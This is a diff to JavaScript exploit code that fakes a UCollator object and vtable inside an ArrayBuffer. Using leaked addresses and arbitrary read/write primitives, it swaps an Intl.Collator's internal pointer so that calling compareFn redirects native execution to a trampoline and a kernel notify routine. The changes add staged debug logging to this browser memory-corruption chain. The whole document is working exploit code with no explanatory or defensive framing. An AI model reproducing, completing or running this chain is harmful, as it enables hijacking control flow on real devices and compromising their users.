@@ -130,12 +130,14 @@ function backingFromArrayBufferChain(p, leakval, ab, implOff, dataOff) {
 function resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log, opts) {
     opts = opts || {};
     const arenaScan = opts.arenaScan === true;
+    const flush = opts.flush || null;
+    const bump = function (tag, detail) { stageBump(log, flush, tag, detail); };
     let viewCell;
     try { viewCell = leakval(arenaView); } catch (e) {
-        log("NOTIFY-ARENA", "leakval(view) failed: " + (e && e.message ? e.message : e));
+        bump("NOTIFY-S11a", "leakval(view) fail: " + (e && e.message ? e.message : e));
         return null;
     }
-    log("NOTIFY-ARENA", "viewCell=" + viewCell);
+    bump("NOTIFY-S11b", "viewCell=" + viewCell);
 
     function trySlot(slot) {
         const ptr = readCanonicalPtr(p, viewCell.add32(slot));
@@ -313,6 +315,11 @@ function findTrampolineRva(p, lk, knownRva, log, opts) {
     return knownRva > 0 ? knownRva : null;
 }
 
+function stageBump(log, flush, tag, detail) {
+    log(tag, detail == null ? "" : detail);
+    if (typeof flush === "function") flush();
+}
+
 function arrayBufferBacking(p, off, arenaBuffer, arenaView, leakval, log, opts) {
     return resolveArenaBacking(p, off, arenaBuffer, arenaView, leakval, log, opts);
 }
@@ -324,42 +331,59 @@ export function pinNotifyHeap(ctx) {
     const p = ctx.p;
     const off = ctx.off || {};
     const log = ctx.log || function () { };
+    const flush = ctx.flush || null;
+    const bump = function (tag, detail) { stageBump(log, flush, tag, detail); };
     const leakval = ctx.leakval;
     const retain = ctx.retain || [];
     const cfg = resolveNotifyConfig(off, ctx.params);
 
-    log("NOTIFY-PIN", "collator + arena @ fresh heap");
+    bump("NOTIFY-S01", "pin enter");
+    bump("NOTIFY-S02", "new Intl.Collator");
     const realCollator = new Intl.Collator("en", { usage: "search" });
+    bump("NOTIFY-S03", "compareFn prewarm a/b");
     const compareFn = realCollator.compare;
     if (!(compareFn("a", "b") < 0))
         throw new Error("notify pin: collator prewarm failed");
 
+    bump("NOTIFY-S04", "build 0xc30 notify string");
     const notificationRequest = getNotificationRequest(cfg.message);
+    bump("NOTIFY-S04-OK", "req len=" + notificationRequest.length);
+    bump("NOTIFY-S05", "ArrayBuffer 0x" + ARENA_BYTES.toString(16));
     const arenaBuffer = new ArrayBuffer(ARENA_BYTES);
+    bump("NOTIFY-S06", "Uint8Array view");
     const arenaView = new Uint8Array(arenaBuffer);
+    bump("NOTIFY-S07", "arena marker ROP1");
     arenaView[ARENA_MARKER_OFF] = 0x52;
     arenaView[ARENA_MARKER_OFF + 1] = 0x4f;
     arenaView[ARENA_MARKER_OFF + 2] = 0x50;
     arenaView[ARENA_MARKER_OFF + 3] = 0x31;
+    bump("NOTIFY-S08", "retain push x5");
     retain.push(realCollator, compareFn, arenaBuffer, arenaView, notificationRequest);
 
+    bump("NOTIFY-S09", "leakval(collator)");
     const realCollatorAddr = leakval(realCollator);
+    bump("NOTIFY-S10", "read compareFn @ +0x10");
     const compareFnAddr = readLow48(p, realCollatorAddr.add32(COLLATOR_BOUND_COMPARE_OFF));
+    bump("NOTIFY-S11", "resolve arena m_vector +0x10");
     const arenaBacking = arrayBufferBacking(
         p, off, arenaBuffer, arenaView, leakval, log, {
             bufAddrOff: ctx.bufAddrOff || null,
             arenaScan: false,
+            flush,
         });
     if (!arenaBacking)
         throw new Error("notify pin: arena backing @ +0x10 failed");
+    bump("NOTIFY-S11-OK", "arena=" + arenaBacking);
 
     const fakeUCollatorAddr = arenaBacking.add32(FAKE_UCOLLATOR_OFFSET);
     const fakeVtableAddr = arenaBacking.add32(FAKE_VTABLE_OFFSET);
+    bump("NOTIFY-S12", "fake UCollator vtable ptr");
     putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00, fakeVtableAddr);
+    bump("NOTIFY-S13", "zero padding 0x48-0x68");
     for (let i = 0x48; i < 0x50; i++) arenaView[FAKE_UCOLLATOR_OFFSET + i] = 0;
     for (let i = 0x60; i < 0x68; i++) arenaView[FAKE_UCOLLATOR_OFFSET + i] = 0;
 
-    log("NOTIFY-PIN-OK", "collator=" + realCollatorAddr + " arena=" + arenaBacking);
+    bump("NOTIFY-S14", "PIN-OK coll=" + realCollatorAddr);
     return {
         realCollator,
         compareFn,
@@ -381,35 +405,44 @@ export function pinNotifyHeap(ctx) {
 /**
  * Minimal fire — pinned prep only, ~3 primitive ops + compareFn (no stage/re-read heap).
  */
-export function fireNotifyPinned(p, pin, lk, off, log) {
+export function fireNotifyPinned(p, pin, lk, off, log, opts) {
     if (!p || !pin || !lk || !off)
         throw new Error("notify fire: need p, pin, lk, off");
     log = log || function () { };
+    opts = opts || {};
+    const flush = opts.flush || null;
+    const bump = function (tag, detail) { stageBump(log, flush, tag, detail); };
 
-    const cfg = pin.cfg || {};
+    const cfg = pin.cfg || resolveNotifyConfig(off, null);
     const gdRva = cfg.gd || off.wk_notify_gd || 0;
     const ntRva = cfg.nt || off.k_notify || 0;
     if (!gdRva || !ntRva)
         throw new Error("notify fire: gd/nt missing in offset table");
 
-    log("NOTIFY-COMMIT", "lk=" + lk + " gd=0x" + gdRva.toString(16)
-        + " nt=0x" + ntRva.toString(16) + " (0-read)");
+    bump("NOTIFY-S20", "fire enter lk=" + lk + " gd=0x" + gdRva.toString(16)
+        + " nt=0x" + ntRva.toString(16));
 
     const notifyEntry = lk.add32(ntRva);
     const trampoline = lk.add32(gdRva);
+    bump("NOTIFY-S21", "patch notifyEntry @ fakeUC+0xe0");
     putLow48(pin.arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntry);
+    bump("NOTIFY-S22", "patch trampoline @ fakeVT+0x128");
     putLow48(pin.arenaView, FAKE_VTABLE_OFFSET + 0x128, trampoline);
 
+    bump("NOTIFY-S23", "read8 collator field orig");
     const collatorOriginal = p.read8(pin.collatorFieldAddr);
+    bump("NOTIFY-S24", "write8 fake UCollator ptr");
     p.write8(pin.collatorFieldAddr, pin.fakeUCollatorAddr);
 
     let notifyResult = NaN;
     let callError = null;
+    bump("NOTIFY-S25", "compareFn(0xc30 req, b) — native call");
     try {
         notifyResult = pin.compareFn(pin.notificationRequest, "b");
     } catch (err) {
         callError = err;
     }
+    bump("NOTIFY-S26", "restore collator field");
     p.write8(pin.collatorFieldAddr, collatorOriginal);
 
     if (callError)
@@ -417,7 +450,7 @@ export function fireNotifyPinned(p, pin, lk, off, log) {
 
     const ok = Number.isFinite(notifyResult) && Math.floor(notifyResult) === notifyResult;
     const sent = ok && notifyResult === 0;
-    log("NOTIFY-DONE", "result=" + notifyResult + " sent=" + sent);
+    bump("NOTIFY-S27", "DONE result=" + notifyResult + " sent=" + sent);
     return { result: notifyResult, sent, ok };
 }
 
